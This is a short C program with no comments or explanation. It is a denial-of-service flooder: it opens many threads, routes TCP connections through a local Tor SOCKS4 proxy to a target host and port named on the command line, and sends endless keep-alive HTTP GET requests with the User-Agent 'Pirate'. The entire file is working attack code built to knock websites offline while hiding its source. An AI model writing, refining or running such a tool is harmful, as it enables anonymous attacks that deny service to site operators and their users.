#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <pthread.h>
#include <time.h>
#include <netdb.h>
#include <fcntl.h>

struct sockaddr_in sa;
struct timeval tv;
char *req;
int sizereq;

struct socks4 {
 char ver;
 char cmd;
 short port;
 unsigned int ip;
 char login;
}packeds;

int makedogs() {
 int fd;
 long long reqs = 0;
 fd = socket(AF_INET, SOCK_STREAM, 0); 
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
  printf("opened socket %d\n", fd);
  send(fd, &packeds, 9, MSG_NOSIGNAL);
  while(send(fd, req, sizereq, MSG_NOSIGNAL) != -1) {
   reqs++;
  } 
 } 
 printf("sent %lld requests\n", reqs);
 close(fd);
}

void *ddog(void *unused) {
 while(1) {
  makedogs();
 } 
}

int make_req(char *ip) {
 tv.tv_sec = 1;
 tv.tv_usec = 0;
 req = malloc(1024); 
 sprintf(req, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Pirate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n", ip);
 sizereq = strlen(req);
}

int main(int argc, char **argv) {
 if(argc < 4) {
  printf("ip port threads\n"); 
  return 0;
 }
 struct hostent *host;
 if((host = gethostbyname(argv[1]))) {
  make_req(argv[1]); 
  packeds.ver = 4;
  packeds.cmd = 1; 
  packeds.ip = *((unsigned int *)host->h_addr); 
  packeds.port = htons(atoi(argv[2])); 
  sa.sin_addr.s_addr = inet_addr("127.0.0.1"); 
  sa.sin_port = htons(9050); 
  sa.sin_family = AF_INET;
  pthread_t thread[atoi(argv[3])];
  while(1) {
   for(int i = 0; i < atoi(argv[3]); i++) {
    pthread_create(&thread[i], 0, &ddog, 0); 
   }
   for(int i = 0; i < atoi(argv[3]); i++) {
    pthread_join(thread[i], 0);
   }
  }
 } else {
  printf("invalid domain\n"); 
 }
}